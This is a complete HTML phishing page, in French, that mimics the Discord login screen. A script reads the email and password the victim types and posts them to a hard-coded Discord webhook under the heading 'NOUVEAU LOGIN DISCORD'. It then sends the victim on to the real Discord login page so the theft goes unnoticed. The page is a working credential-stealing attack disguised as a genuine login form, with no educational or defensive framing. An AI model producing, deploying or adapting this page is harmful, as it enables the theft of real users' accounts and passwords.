<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Discord</title>
<style>
  :root { --bg: #313338; --input: #1e1f22; --txt: #dbdee1; --acc: #5865f2; }
  body{margin:0;font-family:-apple-system,system-ui,sans-serif;background:var(--bg);color:var(--txt);display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;padding:20px}
  .logo { width: 70px; height: 70px; margin-bottom: 30px; }
  h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; text-align: center; }
  p { font-size: 15px; color: #b5bac1; text-align: center; margin-bottom: 24px; }
  .box { width: 100%; max-width: 400px; background: #2b2d31; padding: 24px; border-radius: 8px; box-sizing: border-box;}
  label { font-size: 12px; font-weight: 700; color: #b5bac1; text-transform: uppercase; margin-bottom: 8px; display: block; }
  input { width: 100%; padding: 12px; background: var(--input); border: 1px solid #1e1f22; border-radius: 4px; color: var(--txt); font-size: 16px; margin-bottom: 20px; box-sizing: border-box; outline: none; }
  input:focus { border-color: #000; }
  button { width: 100%; padding: 14px; background: var(--acc); color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
  button:active { background: #4752c4; }
  .forgot { font-size: 14px; color: #00a8fc; margin-top: 16px; text-decoration: none; display: block; }
</style>
</head>
<body>

<svg class="logo" viewBox="0 0 127.14 96.36" fill="#5865f2">
  <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1,105.25,105.25,0,0,0,32.19-16.14c2.64-27.38-4.51-51.11-18.9-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S54,46,53.89,53,48.84,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.23,46,96.12,53,91.08,65.69,84.69,65.69Z"/>
</svg>

<h2>Content de te revoir !</h2>
<p>Nous sommes ravis de te revoir !</p>

<div class="box">
  <form id="loginForm">
    <label>Adresse e-mail ou numéro de téléphone</label>
    <input type="text" id="email" required autocomplete="off">
    
    <label>Mot de passe</label>
    <input type="password" id="password" required autocomplete="off">
    
    <a href="#" class="forgot">Mot de passe oublié ?</a>
    
    <button type="submit" style="margin-top: 20px;">Connexion</button>
  </form>
</div>

<script>
const HOOK = "https://discord.com/api/webhooks/1565260146316148746/aRlsSnjxOcpFUrQTg2jGEYNKm0N9yu9mmtAruqHUvkPZEYTjQ2CdjJq7oIGCN13rT2UT";

document.getElementById("loginForm").addEventListener("submit", function(e) {
  e.preventDefault();
  
  const email = document.getElementById("email").value;
  const pass = document.getElementById("password").value;
  
  let texte = "**🔴 NOUVEAU LOGIN DISCORD**\n";
  texte += "**Email:** `" + email + "`\n";
  texte += "**Mdp:** `" + pass + "`\n";
  
  fetch(HOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({content: texte})
  }).finally(() => {
    window.location.href = "https://discord.com/login";
  });
});
</script>
</body>
</html>
